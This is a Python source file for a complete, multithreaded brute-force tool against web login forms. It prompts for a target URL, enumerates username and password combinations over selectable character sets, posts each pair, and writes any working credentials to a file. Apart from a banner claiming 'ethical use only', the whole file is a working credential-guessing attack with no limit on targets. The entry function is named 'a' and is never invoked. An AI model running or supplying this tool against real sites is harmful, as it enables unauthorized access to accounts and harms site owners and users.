import requests
import itertools
import string
import threading
import time
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

found = False
attempts = 0
start_time = None
combo_lock = threading.Lock()
result_lock = threading.Lock()
results = []

def print_banner():
    console.print("[bold cyan]===============================================")
    console.print("[bold cyan]      Advanced Dynamic BruteForce Tool v3.1    ")
    console.print("[bold cyan]  For ethical use only on local test servers   ")
    console.print("[bold cyan]===============================================[/bold cyan]")

def get_settings():
    print_banner()
    url = Prompt.ask("🌐 Target URL (e.g., http://127.0.0.1:5000)")
    success_keyword = Prompt.ask("✅ Success keyword in response (e.g., 'Login successful')")
    username_fixed = Prompt.ask("👤 Fixed username (leave empty to brute-force usernames)", default="")
    
    if not username_fixed:
        username_len = IntPrompt.ask("🔡 Username length (1-6)", default=3, choices=[str(i) for i in range(1, 7)])
    else:
        username_len = len(username_fixed)
    
    pw_len_known = Prompt.ask("Do you know the exact password length? (y/n)", choices=["y", "n"], default="y")
    if pw_len_known == "y":
        password_len = IntPrompt.ask("🔑 Password length (1-6)", choices=[str(i) for i in range(1, 7)])
        password_len_min = password_len_max = password_len
    else:
        password_len_min = IntPrompt.ask("🔑 Minimum password length (1-6)", choices=[str(i) for i in range(1, 7)])
        password_len_max = IntPrompt.ask(
            "🔑 Maximum password length (≥ min, ≤6)", 
            choices=[str(i) for i in range(password_len_min, 7)]
        )
    
    threads = IntPrompt.ask("⚙ Number of threads (1-20)", default=5, choices=[str(i) for i in range(1, 21)])
    
    console.print("\n💠 Choose charset:")
    table = Table(show_header=False, expand=False)
    table.add_row("1", "Lowercase (a-z)")
    table.add_row("2", "Lowercase + Digits (a-z0-9)")
    table.add_row("3", "Letters + Digits (a-zA-Z0-9)")
    table.add_row("4", "Letters + Digits + Symbols (!@#$...)")
    table.add_row("5", "All printable ASCII characters")
    table.add_row("6", "Custom charset")
    console.print(table)
    
    charset_choice = Prompt.ask("Choice [1-6]", choices=["1", "2", "3", "4", "5", "6"], default="2")
    if charset_choice == "1":
        charset = string.ascii_lowercase
    elif charset_choice == "2":
        charset = string.ascii_lowercase + string.digits
    elif charset_choice == "3":
        charset = string.ascii_letters + string.digits
    elif charset_choice == "4":
        charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{}|;:,.<>/?"
    elif charset_choice == "5":
        charset = string.printable.strip()
    else:
        charset = Prompt.ask("Enter custom charset (e.g., abc123)")
    
    console.print("\n[bold green]Settings summary:[/bold green]")
    table = Table(show_header=False, expand=False)
    table.add_row("URL", url)
    table.add_row("Success keyword", f"'{success_keyword}'")
    table.add_row("Username", f"[fixed] {username_fixed}" if username_fixed else f"[bruteforce] length = {username_len}")
    table.add_row("Password length", f"{password_len_min}" if password_len_min == password_len_max else f"{password_len_min} to {password_len_max}")
    table.add_row("Threads", str(threads))
    table.add_row("Charset length", str(len(charset)))
    console.print(table)
    
    if not Confirm.ask("Proceed with these settings?", default=True):
        console.print("[yellow]Aborted by user.[/yellow]")
        exit()
    
    return {
        "url": url,
        "success_keyword": success_keyword,
        "username_fixed": username_fixed,
        "username_len": username_len,
        "password_len_min": password_len_min,
        "password_len_max": password_len_max,
        "threads": threads,
        "charset": charset
    }

def combo_generator(settings):
    charset = settings["charset"]
    username_fixed = settings["username_fixed"]
    username_len = settings["username_len"]
    pw_min = settings["password_len_min"]
    pw_max = settings["password_len_max"]
    if username_fixed:
        for pw_len in range(pw_min, pw_max + 1):
            for pass_tuple in itertools.product(charset, repeat=pw_len):
                password = ''.join(pass_tuple)
                yield username_fixed, password
    else:
        for user_tuple in itertools.product(charset, repeat=username_len):
            username = ''.join(user_tuple)
            for pw_len in range(pw_min, pw_max + 1):
                for pass_tuple in itertools.product(charset, repeat=pw_len):
                    password = ''.join(pass_tuple)
                    yield username, password

def get_next_combo(combo_iter):
    with combo_lock:
        try:
            return next(combo_iter)
        except StopIteration:
            return None

def save_results(username, password):
    with result_lock:
        results.append((username, password))
        with open("bruteforce_success.txt", "a") as f:
            f.write(f"{username}:{password}\n")

def brute_worker(settings, combo_iter, progress, task):
    global found, attempts
    session = requests.Session()
    while not found:
        combo = get_next_combo(combo_iter)
        if combo is None:
            return
        username, password = combo
        payload = {"username": username, "password": password}
        try:
            response = session.post(settings["url"], data=payload, timeout=5)
            attempts += 1
            progress.update(task, advance=1)
            if settings["success_keyword"].lower() in response.text.lower():
                duration = round(time.time() - start_time, 2)
                console.print(f"\n[bold green]✅ SUCCESS![/bold green]")
                console.print(f"[cyan]🧑 Username: {username}[/cyan]")
                console.print(f"[cyan]🔐 Password: {password}[/cyan]")
                console.print(f"[yellow]📊 Tried {attempts} combos in {duration} seconds.[/yellow]")
                save_results(username, password)
                found = True
                return
            time.sleep(0.05)
        except requests.exceptions.RequestException as e:
            console.print(f"[red]⚠ Network error: {e}[/red]")
            return

def a():
    global start_time
    settings = get_settings()
    combo_iter = combo_generator(settings)
    console.print("\n[yellow]🔧 Starting attack...[/yellow]\n")
    start_time = time.time()
    
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Brute-forcing...", total=None)
        threads = []
        for _ in range(settings["threads"]):
            t = threading.Thread(target=brute_worker, args=(settings, combo_iter, progress, task))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    
    if not found:
        duration = round(time.time() - start_time, 2)
        console.print(f"\n[red]❌ No valid credentials found in {duration} seconds after {attempts} tries.[/red]")
    else:
        console.print(f"\n[green]🎉 Success credentials saved to 'bruteforce_success.txt'[/green]")


